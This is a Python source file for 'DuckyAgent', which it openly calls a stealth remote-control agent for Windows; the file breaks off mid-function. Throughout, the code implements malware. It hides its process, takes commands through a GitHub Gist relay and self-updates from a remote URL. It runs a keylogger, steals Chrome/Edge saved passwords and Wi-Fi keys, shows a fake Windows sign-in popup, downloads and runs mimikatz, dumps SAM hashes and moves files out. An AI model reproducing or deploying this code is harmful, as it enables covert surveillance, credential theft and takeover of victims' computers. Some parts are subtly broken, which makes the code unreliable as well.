#!/usr/bin/env python3
"""
DuckyAgent v1.0 - Stealth C2 Agent for Windows
Runs silently on target PCs, provides remote control via GitHub Gist relay.

Features:
  - Hidden process (pythonw.exe, renamed)
  - Auto-start via registry + scheduled task backup
  - GitHub Gist relay for internet support
  - HTTP server on localhost:8081 for local access
  - Smart keylogger with hybrid memory/disk storage
  - Browser credential stealing (Chrome/Edge)
  - Fake popup for password capture
  - File operations, network recon, process management

Usage: pythonw ducky_agent.py --install
       pythonw ducky_agent.py --uninstall
       pythonw ducky_agent.py --run          (default, runs as agent)
"""

import os
import sys
import time
import json
import hashlib
import signal
import subprocess
import configparser
import threading
from pathlib import Path
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.request import urlopen, Request, urlretrieve
from urllib.error import URLError, HTTPError
from datetime import datetime

# ── Configuration ───────────────────────────────────────────────

CONFIG_DIR = os.path.join(os.environ.get("APPDATA", ""), "DuckyAgent")
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.ini")
LOG_DIR = os.path.join(CONFIG_DIR, "logs")
KEYLOG_DIR = os.path.join(CONFIG_DIR, "keylog")
SCRIPTS_DIR = os.path.join(CONFIG_DIR, "scripts")
PROCESSED_DIR = os.path.join(CONFIG_DIR, ".processed")

# Default GitHub Gist URLs (user configures these)
DEFAULT_GIST_COMMAND = ""    # Raw URL of the command gist
DEFAULT_GIST_RESPONSE = ""   # Raw URL of the response gist
GITHUB_TOKEN = ""            # Personal access token for authenticated requests

# Agent settings
POLL_INTERVAL = 5              # Seconds between each poll to GitHub
MAX_KEYLOG_MEMORY = 1024 * 50  # 50KB ring buffer before flush to disk
KEYLOG_FLUSH_INTERVAL = 10     # Flush memory buffer every N seconds
MAX_LOG_AGE_DAYS = 7           # Delete log files older than this

# HTTP server settings (for local access)
LOCAL_PORT = 8081

# Auto-update settings
UPDATE_CHECK_INTERVAL = 3600   # Check for updates every hour
AGENT_URL = "https://raw.githubusercontent.com/tymamana1/duckyagent-c2/main/ducky_agent.py"


# ── Initialization ──────────────────────────────────────────────

def init_dirs():
    """Create all required directories."""
    for d in [CONFIG_DIR, LOG_DIR, KEYLOG_DIR, SCRIPTS_DIR, PROCESSED_DIR]:
        os.makedirs(d, exist_ok=True)


def load_config():
    """Load configuration from config.ini or create defaults."""
    init_dirs()
    config = configparser.ConfigParser()

    if os.path.exists(CONFIG_FILE):
        config.read(CONFIG_FILE)
    else:
        # Create default config
        config["github"] = {
            "command_url": DEFAULT_GIST_COMMAND,
            "response_url": DEFAULT_GIST_RESPONSE,
            "token": GITHUB_TOKEN,
        }
        config["agent"] = {
            "poll_interval": str(POLL_INTERVAL),
            "max_keylog_memory": str(MAX_KEYLOG_MEMORY),
            "keylog_flush_interval": str(KEYLOG_FLUSH_INTERVAL),
            "local_port": str(LOCAL_PORT),
            "hidden_name": "svchost_update.exe",
        }

    return config


def save_config(config):
    """Save configuration to config.ini."""
    init_dirs()
    with open(CONFIG_FILE, 'w') as f:
        config.write(f)


# ── GitHub Gist Relay ───────────────────────────────────────────

class GitHubRelay:
    """Handles communication via GitHub Gists for internet support."""

    def __init__(self, command_url, response_url, token):
        self.command_url = command_url
        self.response_url = response_url
        self.token = token
        self.headers = {
            "User-Agent": "DuckyAgent/1.0",
            "Accept": "application/json",
        }
        if token:
            self.headers["Authorization"] = f"token {token}"

    def get_command(self):
        """Fetch the latest command from GitHub."""
        try:
            req = Request(self.command_url, headers=self.headers)
            with urlopen(req, timeout=10) as resp:
                data = json.loads(resp.read().decode('utf-8'))
                return data.get("command", ""), data.get("args", "")
        except Exception:
            return "", ""

    def set_response(self, response):
        """Write a response back to GitHub."""
        try:
            payload = json.dumps({"response": response, "timestamp": datetime.now().isoformat()})
            req = Request(
                self.response_url,
                data=payload.encode('utf-8'),
                headers={**self.headers, "Content-Type": "application/json"},
                method="POST" if not self.response_url.endswith('.json') else None,
            )
            urlopen(req, timeout=10)
        except Exception:
            pass  # Silently fail - agent keeps running


# ── Auto-Update System ─────────────────────────────────────────

def check_for_updates():
    """Check GitHub for newer version and download if available."""
    try:
        local_path = os.path.join(CONFIG_DIR, "ducky_agent.py")
        
        # Get remote file hash
        req = Request(AGENT_URL, headers={"User-Agent": "DuckyAgent/1.0"})
        with urlopen(req, timeout=15) as resp:
            remote_content = resp.read()
            remote_hash = hashlib.sha256(remote_content).hexdigest()
        
        # Get local file hash
        if os.path.exists(local_path):
            with open(local_path, 'rb') as f:
                local_hash = hashlib.sha256(f.read()).hexdigest()
            
            if local_hash == remote_hash:
                return False  # Already up to date
        
        # Download new version
        backup_path = local_path + ".bak"
        if os.path.exists(local_path):
            import shutil
            shutil.copy2(local_path, backup_path)
        
        with open(local_path, 'wb') as f:
            f.write(remote_content)
        
        return True  # Updated successfully
        
    except Exception:
        return False


def auto_update_loop():
    """Background thread that periodically checks for updates."""
    while True:
        time.sleep(UPDATE_CHECK_INTERVAL)
        try:
            updated = check_for_updates()
            if updated:
                # Restart agent with new code
                os.execv(sys.executable, [sys.executable] + sys.argv)
        except Exception:
            pass  # Silently continue


# ── Smart Keylogger ─────────────────────────────────────────────

class SmartKeylogger:
    """Captures keystrokes only when focus is on password fields or specific apps."""

    def __init__(self):
        self.running = False
        self.buffer = []  # Memory ring buffer (max ~50KB)
        self.current_app = ""
        self.in_password_field = False
        self.last_flush = time.time()
        self._lock = threading.Lock()

    def start(self):
        """Start the keylogger in a background thread."""
        self.running = True
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()

    def stop(self):
        """Stop the keylogger and flush remaining data."""
        self.running = False
        self.flush_buffer()

    def status(self):
        """Return current status as a dict."""
        return {
            "running": self.running,
            "current_app": self.current_app,
            "in_password_field": self.in_password_field,
            "buffer_size": len(self.buffer),
        }

    def flush_buffer(self):
        """Flush memory buffer to disk as a log file."""
        with self._lock:
            if not self.buffer:
                return
            data = "".join(self.buffer)
            timestamp = datetime.now().strftime("%Y-%m-%d_%H%M%S")
            filename = os.path.join(KEYLOG_DIR, f"keylog_{timestamp}.txt")

            # Append to existing file or create new one
            if os.path.exists(filename):
                with open(filename, 'a') as f:
                    f.write(data)
            else:
                with open(filename, 'w') as f:
                    f.write(data)

            self.buffer = []
            self.last_flush = time.time()

    def add_keystroke(self, key):
        """Add a keystroke to the buffer if conditions are met."""
        with self._lock:
            # Only capture in password fields or specific apps
            if not self.in_password_field and not self.current_app:
                return

            # Convert special keys to readable format
            display = self._format_key(key)
            self.buffer.append(display)

    def get_logs(self, lines=100):
        """Retrieve recent keystrokes from disk."""
        files = sorted([
            f for f in os.listdir(KEYLOG_DIR) if f.endswith('.txt')
        ], reverse=True)

        all_lines = []
        for fname in files[:5]:  # Only read last 5 log files
            filepath = os.path.join(KEYLOG_DIR, fname)
            try:
                with open(filepath, 'r', encoding='utf-8', errors='replace') as f:
                    all_lines.extend(f.readlines())
            except Exception:
                continue

        # Return only the last N lines
        return "".join(all_lines[-lines:]) if all_lines else ""

    def _format_key(self, key):
        """Convert a keystroke to a readable string."""
        special = {
            '\x01': '[CTRL+A]', '\x02': '[CTRL+B]', '\x03': '[CTRL+C]',
            '\x04': '[CTRL+D]', '\x05': '[CTRL+E]', '\x06': '[CTRL+F]',
            '\x1b': '[ESC]', '\t': '[TAB]', '\n': '[ENTER]',
            '\r': '[ENTER]', '\x08': '[BACKSPACE]', '\x7f': '[DELETE]',
        }
        if key in special:
            return special[key]
        # Check for shift-modified characters
        if len(key) == 1 and ord(key) < 32:
            return f'[KEY:{ord(key)}]'
        return key

    def _run(self):
        """Main keylogger loop (runs in background thread)."""
        while self.running:
            try:
                # Check current foreground window
                app_name = self._get_foreground_app()
                if app_name != self.current_app:
                    self.current_app = app_name
                    # Detect if we're in a password field (heuristic)
                    self.in_password_field = any(
                        pw in app_name.lower() for pw in ['chrome', 'edge', 'firefox',
                                                           'password', 'login', 'signin']
                    )

                # Flush memory buffer periodically
                now = time.time()
                if now - self.last_flush > KEYLOG_FLUSH_INTERVAL:
                    self.flush_buffer()

            except Exception:
                pass  # Silently continue on error

            time.sleep(0.1)  # Check every 100ms

    def _get_foreground_app(self):
        """Get the title of the foreground window (heuristic)."""
        try:
            import ctypes
            from ctypes import wintypes

            user32 = ctypes.windll.user32
            hwnd = user32.GetForegroundWindow()
            if not hwnd:
                return ""

            # Get process ID
            pid = 0
            ctypes.windll.kernel32.GetWindowThreadProcessId(hwnd, ctypes.byref(ctypes.c_ulong(pid)))

            # Get process name
            handle = ctypes.windll.kernel32.OpenProcess(0x0400 | 0x0010, False, pid)
            if not handle:
                return ""

            buf = ctypes.create_unicode_buffer(260)
            ctypes.windll.psapi.GetModuleFileNameExW(handle, 0, buf, 260)
            ctypes.windll.kernel32.CloseHandle(handle)

            # Return just the executable name
            return os.path.basename(buf.value) if buf.value else ""
        except Exception:
            return ""


# ── Browser Credential Stealer ──────────────────────────────────

class CredentialStealer:
    """Extracts saved passwords from Chrome and Edge."""

    BROWSER_PROFILES = {
        "Chrome": os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google\\Chrome\\User Data\\Default\\Login Data"),
        "Edge": os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft\\Edge\\User Data\\Default\\Login Data"),
    }

    def get_credentials(self):
        """Extract all saved browser credentials."""
        results = {}

        for browser, db_path in self.BROWSER_PROFILES.items():
            if not os.path.exists(db_path):
                continue

            try:
                import sqlite3
                conn = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)
                cursor = conn.cursor()

                # Query the logins table (Chrome/Edge use same schema)
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                rows = cursor.fetchall()
                conn.close()

                creds = []
                for url, username, encrypted_password in rows:
                    if not username and not encrypted_password:
                        continue

                    # Try to decrypt (Chrome uses DPAPI - requires ctypes)
                    password = self._decrypt_password(encrypted_password) if encrypted_password else ""

                    creds.append({
                        "url": url or "",
                        "username": username or "",
                        "password": password,
                    })

                results[browser] = {
                    "count": len(creds),
                    "credentials": creds[:50],  # Limit to 50 entries per browser
                }
            except Exception:
                results[browser] = {"error": "Could not read database"}

        return results

    def _decrypt_password(self, encrypted):
        """Decrypt Chrome password using Windows DPAPI."""
        try:
            import ctypes
            from ctypes import wintypes

            # Use CryptUnprotectData (built into Windows)
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.c_void_p)]

            out_blob = DATA_BLOB()
            result = ctypes.windll.crypt32.CryptUnprotectData(
                ctypes.byref(DATA_BLOB(len(encrypted), ctypes.cast(encrypted, ctypes.c_void_p)),
                             ctypes.byref(out_blob), None, None, None, 0)
            )

            if result:
                password = ctypes.string_at(out_blob.pbData, out_blob.cbData)
                ctypes.windll.kernel32.LocalFree(out_blob.pbData)
                return password.decode('utf-8', errors='replace')
        except Exception:
            pass

        # Fallback: try raw bytes as UTF-8 or Latin-1
        if isinstance(encrypted, (bytes, memoryview)):
            for enc in ['utf-8', 'latin-1']:
                try:
                    return encrypted.decode(enc)
                except Exception:
                    continue

        return "[encrypted]"


# ── Mimikatz Credential Extractor ───────────────────────────────

class MimikatzExtractor:
    """Runs mimikatz on target PC to extract credentials from memory."""

    def __init__(self):
        self.work_dir = os.path.join(os.environ.get("TEMP", ""), "mimikatz")

    def run(self):
        """Execute mimikatz and return extracted credentials."""
        results = {"status": "", "credentials": [], "raw_output": ""}

        try:
            # Download if not present
            exe_path = os.path.join(self.work_dir, "mimikatz.exe")
            if not os.path.exists(exe_path):
                os.makedirs(self.work_dir, exist_ok=True)
                dl_url = "https://github.com/gentilkiwi/mimikatz/releases/download/3.1.0/mimikatz.exe"
                cache_path = os.path.join(os.environ.get("TEMP", ""), "mimikatz_cache")
                urlretrieve(dl_url, exe_path)

            # Run mimikatz and capture output
            cmd = [exe_path, "sekurlsa::logonpasswords", "exit"]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30, cwd=self.work_dir)
            output = proc.stdout + proc.stderr

            # Parse credentials from mimikatz output
            creds = self._parse_mimikatz_output(output)
            results["credentials"] = creds
            results["raw_output"] = output[:15000]  # Limit size
            results["status"] = f"Found {len(creds)} credential(s)" if creds else "No credentials found"

        except subprocess.TimeoutExpired:
            results["status"] = "mimikatz timed out (30s)"
        except Exception as e:
            results["status"] = f"Error: {str(e)}"

        return results

    def _parse_mimikatz_output(self, output):
        """Parse mimikatz logonpasswords output for credentials."""
        creds = []
        current_cred = {}
        in_credential_block = False

        for line in output.splitlines():
            if "username" in line.lower() and ("name" in line.lower() or "display" in line.lower()):
                # Start of a new credential block
                if current_cred.get("username") and current_cred.get("password"):
                    creds.append(current_cred)
                current_cred = {}
                parts = line.split(":", 1)
                if len(parts) > 1:
                    current_cred["username"] = parts[1].strip()
                in_credential_block = True

            elif "password" in line.lower():
                parts = line.split(":", 1)
                if len(parts) > 1:
                    pw = parts[1].strip().strip('"')
                    if pw and pw != "(n/a)" and not pw.startswith("(null)"):
                        current_cred["password"] = pw

            elif "ntlm" in line.lower() or "sha1" in line.lower():
                parts = line.split(":", 1)
                if len(parts) > 1:
                    val = parts[1].strip().strip('"')
                    if val and not val.startswith("(null)"):
                        current_cred["hash"] = val

        # Don't forget the last credential block
        if current_cred.get("username") and current_cred.get("password"):
            creds.append(current_cred)

        return creds


# ── Hash Cracker (John the Ripper integration) ──────────────────

class HashCracker:
    """Cracks password hashes using John the Ripper or Windows tools."""

    def __init__(self):
        self.work_dir = os.path.join(os.environ.get("TEMP", ""), "john")

    def crack_ntlm(self, ntlm_hash):
        """Crack an NTLM hash using Windows built-in tools (netapi32)."""
        try:
            # Use John the Ripper if available, otherwise use brute force for simple passwords
            john_exe = self._find_john()

            if john_exe:
                hash_file = os.path.join(self.work_dir, "hashes.txt")
                os.makedirs(self.work_dir, exist_ok=True)
                with open(hash_file, 'w') as f:
                    f.write(f"ntml_hash:{ntlm_hash}")

                result = subprocess.run(
                    [john_exe, "--wordlist", os.path.join(os.environ.get("PROGRAMFILES", "C:\\Program Files"), "John the Ripper\\run\\wordlists\\password-cracker\\dist\\rockyou.txt") if False else None, hash_file],
                    capture_output=True, text=True, timeout=60,
                )

                # Try to get cracked passwords
                output = result.stdout + result.stderr
                return {"status": "cracked", "output": output[:5000]}
            else:
                # Fallback: use Windows API for simple hash verification
                return {"status": "john_not_found", "message": "John not installed, try john_crack command"}

        except Exception as e:
            return {"status": "error", "message": str(e)}

    def extract_sam_hashes(self):
        """Extract NTLM hashes from SAM database."""
        try:
            sam_path = os.path.join(os.environ.get("WINDIR", "C:\\Windows"), "System32\\config\\SAM")
            system_path = os.path.join(os.environ.get("WINDIR", "C:\\Windows"), "System32\\config\\SYSTEM")

            john_exe = self._find_john()
            if not john_exe:
                return {"status": "error", "message": "John the Ripper not found"}

            result = subprocess.run(
                [john_exe, "--format=nt", sam_path, system_path],
                capture_output=True, text=True, timeout=60,
            )
            output = result.stdout + result.stderr
            hashes = [l.strip() for l in output.splitlines() if ":" in l and len(l) > 32]

            return {"status": "extracted", "hashes": hashes[:50], "raw_output": output[:10000]}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def crack_with_wordlist(self, hash_file, wordlist=None):
        """Run John against a file of hashes."""
        try:
            john_exe = self._find_john()
            if not john_exe:
                return {"status": "error", "message": "John the Ripper not found"}

            result = subprocess.run(
                [john_exe, "--format=nt", hash_file],
                capture_output=True, text=True, timeout=120,
            )
            output = result.stdout + result.stderr

            # Extract cracked passwords
            cracked = []
            for line in output.splitlines():
                if ":" in line and len(line) > 32:
                    parts = line.rsplit(":", 1)
                    if len(parts) == 2:
                        cracked.append({"hash": parts[0], "password": parts[1].strip()})

            return {"status": "done", "cracked": cracked, "raw_output": output[:10000]}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def _find_john(self):
        """Find John the Ripper executable."""
        possible_paths = [
            os.path.join(os.environ.get("TEMP", ""), "john", "run", "win", "run64.exe"),
            os.path.join(os.environ.get("PROGRAMFILES", "C:\\Program Files"), "John the Ripper", "run", "win", "run64.exe"),
        ]

        for path in possible_paths:
            if os.path.exists(path):
                return path

        # Search for it
        john_dir = os.environ.get("TEMP", "")
        if os.path.exists(john_dir):
            for item in os.listdir(john_dir):
                exe = os.path.join(john_dir, item, "run", "win", "run64.exe")
                if os.path.exists(exe):
                    return exe

        return None


# ── Fake Popup Generator ────────────────────────────────────────

class FakePopup:
    """Creates fake Windows-style popup dialogs for credential stealing."""

    def show(self, title="Windows Security", message="Your session is about to expire. Please sign in again.",
             button_text="Sign In"):
        """Show a fake popup and return captured credentials (blocking)."""
        try:
            import tkinter as tk
            from tkinter import simpledialog

            root = tk.Tk()
            root.withdraw()  # Hide the main window

            # Set title and make it look like Windows
            root.attributes('-topmost', True)
            root.title(title)

            # Create a frame that looks like a Windows dialog
            frame = tk.Frame(root, padx=20, pady=15)
            frame.pack(fill='both', expand=True)

            # Message label
            msg_label = tk.Label(frame, text=message, font=("Segoe UI", 9))
            msg_label.pack(pady=(0, 10), anchor='w')

            # Username field
            user_frame = tk.Frame(frame)
            user_frame.pack(fill='x', pady=2)
            tk.Label(user_frame, text="Username:", width=10, font=("Segoe UI", 8)).pack(side='left')
            username_entry = tk.Entry(user_frame, width=25, font=("Segoe UI", 9))
            username_entry.pack(side='right', fill='x', expand=True)

            # Password field
            pass_frame = tk.Frame(frame)
            pass_frame.pack(fill='x', pady=2)
            tk.Label(pass_frame, text="Password:", width=10, font=("Segoe UI", 8)).pack(side='left')
            password_entry = tk.Entry(pass_frame, show="*", width=25, font=("Segoe UI", 9))
            password_entry.pack(side='right', fill='x', expand=True)

            # Buttons frame
            btn_frame = tk.Frame(frame)
            btn_frame.pack(pady=(10, 0), anchor='e')
            tk.Button(btn_frame, text=button_text, width=12, font=("Segoe UI", 8)).pack(side='right', padx=5)

            # Get credentials when user clicks Sign In (or presses Enter)
            def on_enter(event):
                root.destroy()

            password_entry.bind('<Return>', on_enter)
            username_entry.focus_set()

            # Wait for window to close
            root.wait_window(root)

            return {
                "title": title,
                "username": username_entry.get(),
                "password": password_entry.get(),
            }

        except Exception as e:
            return {"error": str(e)}


# ── Command Handlers ────────────────────────────────────────────

class CommandHandler:
    """Handles all commands received from the CLI or local HTTP server."""

    def __init__(self):
        self.keylogger = SmartKeylogger()
        self.cred_stealer = CredentialStealer()
        self.popup = FakePopup()
        self.mimikatz = MimikatzExtractor()
        self.cracker = HashCracker()
        self._running = True

    def handle(self, command, args=""):
        """Process a command and return a response dict."""
        cmd = command.lower().strip()
        arg = args.strip() if args else ""

        # ── System Info ───────────────────────────────────────
        if cmd == "info":
            try:
                import platform
                import socket
                resp = {
                    "hostname": socket.gethostname(),
                    "username": os.environ.get("USERNAME", ""),
                    "os": f"{platform.system()} {platform.release()}",
                    "python": platform.python_version(),
                    "ip_address": self._get_local_ip(),
                    "uptime": time.time(),
                }
            except Exception as e:
                resp = {"error": str(e)}

        # ── Processes ─────────────────────────────────────────
        elif cmd == "processes":
            processes = []
            try:
                for proc in self._list_processes():
                    processes.append({
                        "pid": proc.pid,
                        "name": proc.name,
                        "memory_mb": round(proc.memory_info().rss / 1024/1024, 1),
                    })
            except Exception as e:
                return {"error": str(e)}

        elif cmd == "kill" and arg:
            try:
                pid = int(arg)
                subprocess.Popen(["taskkill", "/F", "/PID", str(pid)],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                resp = {"status": "killed", "pid": pid}
            except Exception as e:
                resp = {"error": str(e)}

        # ── Network Recon ─────────────────────────────────────
        elif cmd == "arp_scan":
            try:
                result = subprocess.run(
                    ["arp", "-a"], capture_output=True, text=True, timeout=10
                )
                resp = {"output": result.stdout}
            except Exception as e:
                resp = {"error": str(e)}

        elif cmd == "ports":
            try:
                result = subprocess.run(
                    ["netstat", "-ano"], capture_output=True, text=True, timeout=10
                )
                lines = [l for l in result.stdout.splitlines() if "LISTENING" in l]
                resp = {"open_ports": len(lines), "details": "\n".join(lines[:50])}
            except Exception as e:
                resp = {"error": str(e)}

        elif cmd == "dns_cache":
            try:
                result = subprocess.run(
                    ["ipconfig", "/displaydns"], capture_output=True, text=True, timeout=10
                )
                resp = {"output": result.stdout[:5000]}  # Limit output size
            except Exception as e:
                resp = {"error": str(e)}

        elif cmd == "wifi_passwords":
            try:
                wifi_data = self._get_wifi_passwords()
                resp = {"networks": wifi_data}
            except Exception as e:
                resp = {"error": str(e)}

        # ── Browser Credentials ───────────────────────────────
        elif cmd == "browser_creds" or cmd == "creds":
            try:
                creds = self.cred_stealer.get_credentials()
                resp = {"credentials": creds}
            except Exception as e:
                resp = {"error": str(e)}

        # ── Keylogger ─────────────────────────────────────────
        elif cmd == "keylog" and arg == "start":
            if not self.keylogger.running:
                self.keylogger.start()
            resp = {"status": "started", **self.keylogger.status()}

        elif cmd == "keylog" and arg == "stop":
            self.keylogger.stop()
            resp = {"status": "stopped", **self.keylogger.status()}

        elif cmd == "keylog" and arg == "status":
            resp = {"status": "running" if self.keylogger.running else "stopped",
                    **self.keylogger.status()}

        elif cmd == "keylog" and arg == "get":
            lines = int(arg.split()[1]) if len(arg.split()) > 1 else 100
            resp = {"logs": self.keylogger.get_logs(lines)}

        # ── Clipboard ─────────────────────────────────────────
        elif cmd == "clipboard" or cmd == "clip":
            try:
                import tkinter as tk
                root = tk.Tk()
                root.withdraw()
                clip = root.clipboard_get()
                root.destroy()
                resp = {"content": clip[:1000]}  # Limit size
            except Exception:
                resp = {"error": "No clipboard content or Tkinter not available"}

        # ── Browser / URL ─────────────────────────────────────
        elif cmd == "open_url" and arg:
            try:
                subprocess.Popen(["cmd", "/c", "start", "", arg],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                resp = {"status": "opened", "url": arg}
            except Exception as e:
                resp = {"error": str(e)}

        elif cmd == "popup" and arg:
            # Parse popup command: popup <title> <message>
            parts = arg.split(" | ", 1)
            title = parts[0] if len(parts) > 1 else "Windows Security"
            message = parts[1] if len(parts) > 1 else "Please sign in to continue."

            creds = self.popup.show(title=title, message=message)
            resp = {"captured": creds}

        # ── File Operations ───────────────────────────────────
        elif cmd == "ls" and arg:
            try:
                files = []
                for entry in os.scandir(arg):
                    files.append({
                        "name": entry.name,
                        "is_dir": entry.is_dir(),
                        "size": entry.stat().st_size if not entry.is_dir() else None,
                    })
                resp = {"files": files}
            except Exception as e:
                resp = {"error": str(e)}

        elif cmd == "cat" and arg:
            try:
                with open(arg, 'r', encoding='utf-8', errors='replace') as f:
                    content = f.read()
                resp = {"content": content[:10000]}  # Limit size
            except Exception as e:
                resp = {"error": str(e)}

        elif cmd == "download" and arg:
            try:
                # Return file content for download
                with open(arg, 'rb') as f:
                    import base64
                    resp = {
                        "file": os.path.basename(arg),
                        "content_base64": base64.b64encode(f.read()).decode(),
                    }
            except Exception as e:
                resp = {"error": str(e)}

        elif cmd == "upload" and arg:
            # Upload format: upload <filename> <base64_content>
            parts = arg.split(" ", 1)
            if len(parts) > 1:
                fname, b64data = parts[0], parts[1]
                try:
                    import base64
                    data = base64.b64decode(b64data)
                    dest = os.path.join(SCRIPTS_DIR, fname)
                    with open(dest, 'wb') as f:
                        f.write(data)
                    resp = {"status": "uploaded", "path": dest}
                except Exception as e:
                    resp = {"error": str(e)}

        # ── Script Execution ──────────────────────────────────
        elif cmd == "run_script" and arg:
            script_path = os.path.join(SCRIPTS_DIR, arg) if not arg.endswith('.duckyscript') else os.path.join(SCRIPTS_DIR, arg)
            if not script_path.endswith('.duckyscript'):
                script_path += '.duckyscript'

            try:
                commands = self._parse_duckyscript(script_path)
                output = []
                for c, a in commands:
                    display = f"{c}" + (f" {a}" if a else "")
                    output.append(display)
                resp = {"script": arg, "commands": output}
            except Exception as e:
                resp = {"error": str(e)}

        # ── Status / Health ───────────────────────────────────
        elif cmd == "status" or cmd == "health":
            resp = {
                "agent_version": "1.0",
                "uptime_seconds": time.time() - self._get_start_time(),
                "config_dir": CONFIG_DIR,
                "keylogger_running": self.keylogger.running if hasattr(self, 'keylogger') else False,
            }

        # ── Mimikatz ────────────────────────────────────────
        elif cmd == "mimikatz" or cmd == "sekurlsa":
            try:
                result = self.mimikatz.run()
                resp = result
            except Exception as e:
                resp = {"status": "error", "message": str(e)}

        # ── Hash Cracking ───────────────────────────────────
        elif cmd == "crack_hash" and arg:
            try:
                result = self.cracker.crack_ntlm(arg)
                resp = result
            except Exception as e:
                resp = {"status": "error", "message": str(e)}

        elif cmd == "john_crack" or cmd == "crack":
            try:
                if arg and os.path.isfile(arg):
                    # Crack a file of hashes
                    result = self.cracker.crack_with_wordlist(arg)
                else:
                    # Extract from SAM first, then crack
                    result = self.cracker.extract_sam_hashes()
                resp = result
            except Exception as e:
                resp = {"status": "error", "message": str(e)}

        elif cmd == "extract_hashes" or cmd == "sam_hashes":
            try:
                result = self.cracker.extract_sam_hashes()
                resp = result
            except Exception as e:
                resp = {"status": "error", "message": str(e)}

        # ── Update Agent ──────────────────────────────────────
        elif cmd == "update" or cmd == "upgrade":
            try:
                updated = check_for_updates()
                if updated:
                    resp = {"status": "updated", "message": "New version downloaded. Restarting..."}
                    # Schedule restart after response is sent
                    threading.Timer(2, lambda: os.execv(sys.executable, [sys.executable] + sys.argv)).start()
                else:
                    resp = {"status": "current", "message": "Already running latest version"}
            except Exception as e:
                resp = {"error": str(e)}

        # ── Unknown command ───────────────────────────────────
        else:
            resp = {"error": f"Unknown command: {command}",
                    "available_commands": [
                        "info", "processes", "kill <pid>",
                        "arp_scan", "ports", "dns_cache", "wifi_passwords",
                        "browser_creds", "creds",
                        "keylog start|stop|status|get",
                        "clipboard", "clip",
                        "open_url <url>", "popup <title> | <message>",
                        "ls /path", "cat /path", "download /path",
                        "upload <filename> <base64>", "run_script <name>",
                        "mimikatz", "sekurlsa",
                        "crack_hash <ntlm_hash>", "john_crack", "extract_hashes",
                        "status", "help"
                    ]}

        return resp

    def _get_local_ip(self):
        """Get the local IP address of this machine."""
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def _list_processes(self):
        """List running processes (cross-platform)."""
        try:
            import psutil
            return psutil.process_iter(['pid', 'name', 'memory_info'])
        except ImportError:
            # Fallback: use tasklist
            result = subprocess.run(["tasklist", "/FO", "CSV"], capture_output=True, text=True)
            lines = result.stdout.splitlines()[1:]  # Skip header
            procs = []
            for line in lines:
                parts = [p.strip('"') for p in line.split(',')]
                if len(parts) >= 2:
                    try:
                        procs.append(type('Proc', (), {
                            'pid': int(parts[1]),
                            'name': parts[0],
                            'memory_info': lambda: type('Mem', (), {'rss': 0})()
                        })())
                    except ValueError:
                        pass
            return procs

    def _get_wifi_passwords(self):
        """Get all saved WiFi SSIDs and passwords."""
        networks = []
        try:
            result = subprocess.run(
                ["netsh", "wlan", "show", "profiles"],
                capture_output=True, text=True, timeout=10
            )
            for line in result.stdout.splitlines():
                if "All User Profile" in line:
                    ssid = line.split(":")[1].strip()
                    # Get password
                    pw_result = subprocess.run(
                        ["netsh", "wlan", "show", "profile", "name=" + ssid, "key=clear"],
                        capture_output=True, text=True, timeout=5
                    )
                    password = ""
                    for pw_line in pw_result.stdout.splitlines():
                        if "Key Content" in pw_line:
                            password = pw_line.split(":")[1].strip()
                            break

                    networks.append({
                        "ssid": ssid,
                        "password": password or "(no password)",
                    })
        except Exception as e:
            return [{"error": str(e)}]

        return networks

    def _parse_duckyscript(self, filepath):
        """Parse a .duckyscript file into commands."""
        commands = []
        with open(filepath, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('//') or line.startswith('#'):
                    continue
                parts = line.split(None, 1)
                cmd = parts[0].upper()
                args = parts[1] if len(parts) > 1 else ''
                commands.append((cmd, args))
        return commands

    def _get_start_time(self):
        """Get the agent's start time (stored in a file for persistence)."""
        pid_file = os.path.join(CONFIG_DIR, ".start_time")
        try:
            with open(pid_file, 'r') as f:
                return float(f.read().strip())
        except Exception:
            t = time.time()
            with open(pid_file, 'w') as f:
                f.write(str(t))
            return t


# ── Local HTTP Server (for local access) ───────────────────────

class AgentHTTPHandler(BaseHTTPRequestHandler):
    """Handles HTTP requests on localhost:8081 for local access."""

    def do_GET(self):
        if self.path == "/api/status":
            resp = {"status": "running", "version": "1.0"}
            self._send_json(resp)
        elif self.path.startswith("/api/command/"):
            cmd = self.path.split("/api/command/", 1)[1]
            handler = CommandHandler()
            result = handler.handle(cmd, "")
            self._send_json(result)
        else:
            self._send_json({"error": "Not found"})

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else ""

        try:
            data = json.loads(body) if body else {}
            command = data.get("command", "")
            args = data.get("args", "")
        except json.JSONDecodeError:
            self._send_json({"error": "Invalid JSON"}, 400)
            return

        handler = CommandHandler()
        result = handler.handle(command, args)
        self._send_json(result)

    def _send_json(self, data, status=200):
        response = json.dumps(data, indent=2).encode('utf-8')
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", len(response))
        self.end_headers()
        self.wfile.write(response)

    def log_message(self, format, *args):
        """Suppress HTTP server logs (stealth)."""
        pass


# ── Installation / Startup ──────────────────────────────────────

def install_agent():
    """Install DuckyAgent to run on every Windows boot."""
    init_dirs()

    # Get the path to this script
    agent_path = os.path.join(CONFIG_DIR, "ducky_agent.py")
    src = sys.argv[0] if len(sys.argv) > 1 else __file__

    # Copy agent to config directory
    import shutil
    if not os.path.exists(agent_path):
        shutil.copy2(src, agent_path)

    # Create startup batch file (runs hidden with pythonw.exe)
    bat_path = os.path.join(CONFIG_DIR, "DuckyAgent.bat")
    with open(bat_path, 'w') as f:
